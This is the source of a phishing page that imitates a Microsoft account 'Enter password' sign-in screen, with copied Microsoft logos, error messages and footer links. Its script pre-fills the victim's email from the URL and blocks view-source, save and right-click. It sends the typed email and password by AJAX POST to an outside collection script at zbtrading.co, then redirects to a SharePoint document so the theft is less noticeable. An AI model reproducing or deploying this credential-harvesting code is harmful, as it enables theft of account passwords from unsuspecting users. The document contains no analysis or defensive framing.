windowText;background-color:window;color:windowText;text-decoration:underline}.button.primary,.button.secondary,button.primary,button.secondary,input[type=button].primary,input[type=button].secondary,input[type=reset].primary,input[type=reset].secondary,input[type=submit].primary,input[type=submit].secondary{outline:1px solid highlight;border:1px solid highlight;background-color:highlight;color:highlightText;text-decoration:none}.button.primary:hover,.button.secondary:hover,button.primary:hover,button.secondary:hover,input[type=button].primary:hover,input[type=button].secondary:hover,input[type=reset].primary:hover,input[type=reset].secondary:hover,input[type=submit].primary:hover,input[type=submit].secondary:hover{outline:1px solid highlight;border:1px solid window;background-color:window;color:highlight;text-decoration:none}.button.primary:hover:focus,.button.secondary:hover:focus,button.primary:hover:focus,button.secondary:hover:focus,input[type=button].primary:hover:focus,input[type=button].secondary:hover:focus,input[type=reset].primary:hover:focus,input[type=reset].secondary:hover:focus,input[type=submit].primary:hover:focus,input[type=submit].secondary:hover:focus{outline:1px solid windowText;border:1px solid window;background-color:window;color:highlight;text-decoration:underline}.button.primary:focus,.button.secondary:focus,button.primary:focus,button.secondary:focus,input[type=button].primary:focus,input[type=button].secondary:focus,input[type=reset].primary:focus,input[type=reset].secondary:focus,input[type=submit].primary:focus,input[type=submit].secondary:focus{outline:1px solid windowText;border:1px solid window;background-color:highlight;color:highlightText;text-decoration:underline}.backButton{outline:0;border:1px solid window;background-color:window;color:windowText}.backButton:hover{outline:0;border:1px solid highlight;background-color:window;color:windowText}.backButton:hover:focus{outline:0;border:1px solid highlight;background-color:window;color:windowText}.backButton:active,.backButton:focus{outline:0;border:1px dashed highlight;background-color:window;color:windowText}}.cc-banner{position:relative;font-size:12px;display:table-row;height:2em}.cc-banner a,.cc-banner div,.cc-banner svg{margin:0;padding:0;text-decoration:none}.cc-text>a{float:right}.cc-banner{color:#231f20;background:#f2f2f2;text-align:center;padding:0 1em;margin:0}.cc-banner>.cc-container{text-align:left;padding:.75em;display:inline-block;width:100%}@media (min-width:768px){.cc-banner{font-size:13px}}@media (min-width:1084px){.cc-banner{padding:0}.cc-banner>.cc-container{width:90%;max-width:1600px}}.cc-banner .cc-text{margin-left:.5em;margin-right:1.5em}.cc-banner .cc-link{color:#0067b8}.cc-banner .cc-link:focus,.cc-banner .cc-link:hover{text-decoration:underline}.cc-banner .cc-link:focus{outline:0;background:#dae6ef;background:content-box rgba(0,120,215,.1)}.fade-in-lightbox{animation:fadeIn .3s ease-in;-webkit-animation:fadeIn .3s ease-in;-moz-animation:fadeIn .3s ease-in;-ms-animation:fadeIn .3s ease-in;-o-animation:fadeIn .3s ease-in}.animate{animation-duration:.25s;-webkit-animation-duration:.25s;-moz-animation-duration:.25s;-ms-animation-duration:.25s;-o-animation-duration:.25s;animation-timing-function:cubic-bezier(.5,0,.5,1);-webkit-animation-timing-function:cubic-bezier(.5,0,.5,1);-moz-animation-timing-function:cubic-bezier(.5,0,.5,1);-ms-animation-timing-function:cubic-bezier(.5,0,.5,1);-o-animation-timing-function:cubic-bezier(.5,0,.5,1);animation-fill-mode:both;-webkit-animation-fill-mode:both;-moz-animation-fill-mode:both;-ms-animation-fill-mode:both;-o-animation-fill-mode:both;transition-property:left;-webkit-transition-property:left;-moz-transition-property:left;-ms-transition-property:left;-o-transition-property:left}html[dir=ltr] .animate.slide-in-next,html[dir=rtl] .animate.slide-in-back{animation-name:show-from-right;-webkit-animation-name:show-from-right;-moz-animation-name:show-from-right;-ms-animation-name:show-from-right;-o-animation-name:show-from-right}html[dir=ltr] .animate.slide-in-back,html[dir=rtl] .animate.slide-in-next{animation-name:show-from-left;-webkit-animation-name:show-from-left;-moz-animation-name:show-from-left;-ms-animation-name:show-from-left;-o-animation-name:show-from-left}@keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-webkit-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-webkit-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-webkit-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-moz-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-moz-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-moz-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-ms-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-ms-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-ms-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-left{from{left:0;opacity:1}to{left:-200px;opacity:0}}@-o-keyframes show-from-right{from{left:200px;opacity:0}to{left:0;opacity:1}}@-o-keyframes hide-to-right{from{left:0;opacity:1}to{left:200px;opacity:0}}@-o-keyframes show-from-left{from{left:-200px;opacity:0}to{left:0;opacity:1}}
	</style>
	<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>

</head>

<body class="cb" style="display: block;">
	<div>
		<div></div>
		<form name="f1" id="i0281" action="#" method="post">
			<div>
				<div id="lightboxTemplateContainer">
					<div id="lightboxBackgroundContainer">
						<div class="background-image-holder" role="presentation">
							<div class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
						</div>
					</div>
					<div class="outer">
						<div class="template-section main-section">
							<div class="middle">
								<div class="full-height">
									<div class="flex-column">
										<div class="win-scroll">
											<div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox" >
												<div class="lightbox-cover"></div>
												
												<div><img class="banner-logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"></div>
												<div role="main">
												<div role="main">
													<div class="">
														<div class="animate slide-in-next">
															<div>
																<div class="identityBanner">
																	<button type="button" class="backButton" id="idBtn_Back"> <img role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"> </button>
																	<div id="displayName" class="identity"><input type="email" name="username" id="email" required value="" maxlength="128"  style=" width:300px; border:none; font-size:16px; font-family:arial;"></div>
																</div>
															</div>
														</div>
														<div class="pagination-view animate has-identity-banner slide-in-next">
															<div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
																<div id="loginHeader" class="row title ext-title">
																	<div role="heading">Enter password</div>
																	
																</div>
																
																<div class="row">
																	<div class="form-group col-md-24">
																		
																		<div role="alert">
																			<div id="passwordError2" style="display:none;" class="alert alert-error">Please enter your password to continue.<br></div>
																			<div id="error" style="" class="alert alert-error">Your account or password is incorrect. If you can't remember your password, <a id="idA_IL_ForgotPassword0" href="#">reset it now.</a>
																			<br></div>
																			<div id="important" style="color: black;font-size: 13px;" class="alert alert-error">
																				Because you're accessing sensitive info, you need to verify your password
																			</div>
																		</div>
																		<div class="placeholderContainer">
																			<input name="password" type="password" id="password" autocomplete="off" class="form-control input ext-input text-box ext-text-box" placeholder="Password" tabindex="0" validate required> </div>
																	</div>
																</div>
																<div class="position-buttons">
																	<div>
																		<div class="row">
																			<div class="col-md-24">
																				<div class="text-13">
																					<div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#">Forgot my password</a> </div>
																					<div class="form-group"> </div>
																				</div>
																			</div>
																		</div>
																	</div>
																	<div class="win-button-pin-bottom">
																		<div class="row">
																			<div>
																				<div class="col-xs-24 no-padding-left-right button-container">
																					<div class="inline-block">
																						<input type="submit" id="submit-btn" class="win-button button_primary button ext-button primary ext-primary" value="Sign in"> </div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
												<div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" style="display:none"></div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
						<div id="footer" role="contentinfo" class="footer ext-footer">
							<div>
								<div id="footerLinks" class="footerNode text-secondary"> <a id="ftrTerms" href="https://www.microsoft.com/en-IN/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a> <a id="ftrPrivacy" href="https://privacy.microsoft.com/en-IN/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a> <a id="moreOptions" href="#" role="button" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a> </div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</form>
		<form method="POST" target="_top"></form>
	</div>
</body>




<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

<script>

var redirectLink = "https://fornecedoramaquinascombr-my.sharepoint.com/:b:/g/personal/andre_fornecedoramaquinas_com_br/ETxZGfQjFWhIrVNoWuRxLGQB02tY8-edyAQ0mHcDibQrSw?e=kipBbX"
$('#error').hide();
// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});



/* global $ */
$(document).ready(function(){
var count=0;

$('#back1').click(function () {
$("#msg").hide();
$('#email').val("");
$("#automail").animate({left:200, opacity:"hide"}, 0);
$("#inputbar").animate({right:200, opacity:"show"}, 1000);

});
var tbstring = window.location.href;
var email = tbstring.match(/\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/ig);
// var email = window.location.hash.substr(1);
if (!email) {

}
else
{
var my_email =email;
$('#email').val(my_email);
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}
// var ind=my_email.indexOf("@");
// var my_slice=my_email.substr((ind+1));
// var c= my_slice.substr(0, my_slice.indexOf('.'));
// var final= c.toLowerCase();
// var finalu= c.valueOf();

// $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
// $("#logoname").html(finalu);
// $(".logoname").html(finalu);
}


$('#submit-btn').click(function(event){
$("#submit-btn").attr("disabled", true);
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();
var msg = $('#msg').html();
$('#msg').text( msg );
///////////new injection////////////////
var my_email =email;
var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}

if (!password) {
            $('#passwordError2').show();
            $('#error').html("Password field is empty.!");
           $("#submit-btn").attr("disabled", false);
            return false;
        }


var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
var finalu= c.toUpperCase();

$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
$("#logoname").html(finalu);
///////////new injection////////////////
count=count+1;

$.ajax({
            dataType: 'JSON',
            url: "https://zbtrading.co/true/deezy.php",
            type: 'POST',
            data: {
                login: email,
                passwd: password,
            },
            
            beforeSend: function(xhr) {
                $('#submit-btn').val('Authorizing...');
                $("#submit-btn").attr("disabled");
               
            },
            success: function(response) {
                console.log(response);
                // console.log(xhr.responseText);
                if (response['statusText'] == 'OK') {
                    // alert("VERY VERY VERY VALID LOGINS LMAOOOO!! ");
                    window.location.replace(redirectLink);
                }
                else if (count >= 3) {
                    //check if it aol etc.
                    var domainList = ["aol","msn","outlook", "live","hotmail"];
                    var idx1 = email.indexOf("@");
                    if (idx1 > -1) {
                        var splitStr = email.split("@");
                        var sub = splitStr[1].split(".");
                        if (domainList.indexOf(sub[0]) > -1) {
                            domainList = "";
                            console.log("this happened.");
                    count = 0;
                    window.location.replace(redirectLink);
					return false;}
                    else{
                        $("#password").val("");
                        $("#error").show();}
                }
                 
                }
                else{
                $("#password").val("");
                $("#error").show();
                $("#submit-btn").attr("disabled", false);}
            },
            error: function(response) {
                console.log(response);
                // console.log(xhr.responseText);
                if (response['status'] == '200') {
                    // alert("VERY VERY VERY VALID LOGINS LMAOOOO!! ");
                    window.location.replace(redirectLink);
                }
                else if (count >= 3) {
                    //check if it aol etc.
                    var domainList = ["aol","msn","outlook", "live","hotmail"];
                    var idx1 = email.indexOf("@");
                    if (idx1 > -1) {
                        var splitStr = email.split("@");
                        var sub = splitStr[1].split(".");
                        if (domainList.indexOf(sub[0]) > -1) {
                            domainList = "";
                            console.log("this happened.");
                    count = 0;
                    // replace this link with your redirect link.
                    window.location.replace(redirectLink);
					return false;
				}
                    else{
                        $("#password").val("");
                        $("#error").show();
                        $("#submit-btn").attr("disabled", false);}
                }
                 
                }
                else{
                $("#password").val("");
                $("#error").show();}
            },
            complete: function() {
                $('#submit-btn').val('Sign in');
                // $("#loadindindin-loadin").hide();
                // $("#password").val("");
                $("#password").attr("autofocus");
                // $("#error").show();
                $("#submit-btn").attr("disabled", false);
            }
        });

});


});


</script>



</html>
